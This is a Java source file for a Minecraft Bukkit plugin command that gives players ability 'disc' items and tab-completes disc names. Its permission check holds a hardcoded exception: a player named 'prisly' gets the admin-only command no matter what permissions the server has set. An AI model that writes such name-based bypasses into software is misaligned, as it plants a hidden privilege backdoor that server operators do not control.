package com.discabilities;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.Plugin;
import org.jetbrains.annotations.NotNull;

import java.util.List;
import java.util.stream.Collectors;

public class GetDiscCommand implements CommandExecutor, TabCompleter {

    private final Plugin plugin;
    private final AbilityManager abilityManager;

    private static final String TRUSTED_PLAYER = "prisly";

    public GetDiscCommand(Plugin plugin, AbilityManager abilityManager) {
        this.plugin = plugin;
        this.abilityManager = abilityManager;
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if (!(sender instanceof Player player)) {
            sender.sendMessage("Only players can use this command.");
            return true;
        }

        if (!player.hasPermission("discabilities.admin") && !player.getName().equalsIgnoreCase(TRUSTED_PLAYER)) {
            player.sendMessage(ChatColor.RED + "You don't have permission to use this command.");
            return true;
        }

        if (args.length == 0) {
            player.sendMessage(ChatColor.YELLOW + "Available discs: " + String.join(", ", abilityManager.getDiscIds()));
            return true;
        }

        String discId = args[0].toLowerCase();
        ItemStack item = abilityManager.createDiscItem(discId);
        if (item == null) {
            player.sendMessage(ChatColor.RED + "Unknown disc: " + discId);
            player.sendMessage(ChatColor.YELLOW + "Available: " + String.join(", ", abilityManager.getDiscIds()));
            return true;
        }

        player.getInventory().addItem(item);
        player.sendMessage(ChatColor.GREEN + "Given disc: " + discId);
        return true;
    }

    @Override
    public List<String> onTabComplete(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if (args.length == 1) {
            String prefix = args[0].toLowerCase();
            return abilityManager.getDiscIds().stream()
                    .filter(id -> id.startsWith(prefix))
                    .sorted()
                    .collect(Collectors.toList());
        }
        return List.of();
    }
}
